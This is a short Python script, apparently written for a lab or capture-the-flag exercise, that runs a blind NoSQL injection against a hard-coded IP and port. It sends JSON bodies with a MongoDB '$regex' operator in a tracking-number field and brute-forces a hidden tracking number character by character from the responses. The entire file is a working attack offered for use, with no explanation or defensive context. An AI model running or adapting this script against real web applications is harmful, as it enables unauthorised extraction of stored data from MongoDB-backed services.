import requests
import string

# Target URL
URL = "http://94.237.50.242:43915/index.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Accept": "*/*",
    "Content-Type": "application/json",
    "Origin": "http://94.237.50.242:43915",
    "Referer": "http://94.237.50.242:43915/",
    "Connection": "keep-alive"
}

# Proxy configuration
PROXIES = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080"
}

# Valid characters in tracking number
VALID_CHARS = string.digits + string.ascii_letters  # "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# Response indicator for valid tracking number
SUCCESS_RESPONSE_KEYWORD = "Recipient:"

def send_request(tracking_regex):
    payload = {"trackingNum": {"$regex": tracking_regex}}
    response = requests.post(URL, json=payload, headers=HEADERS, proxies=PROXIES, verify=False)
    return SUCCESS_RESPONSE_KEYWORD in response.text

def confirm_end(tracking_number):
    """Confirm the end of the tracking number using the $ regex."""
    return send_request(f"^{tracking_number}$")

def extract_tracking_number():
    tracking_number = ""
    while True:
        found = False
        for char in VALID_CHARS:
            if send_request(f"^{tracking_number}{char}.*"):
                tracking_number += char
                print(f"Current Tracking Number: {tracking_number}")
                found = True
                break
        if not found or confirm_end(tracking_number):
            break
    return tracking_number

if __name__ == "__main__":
    leaked_tracking_number = extract_tracking_number()
    print(f"Leaked Tracking Number: {leaked_tracking_number}")
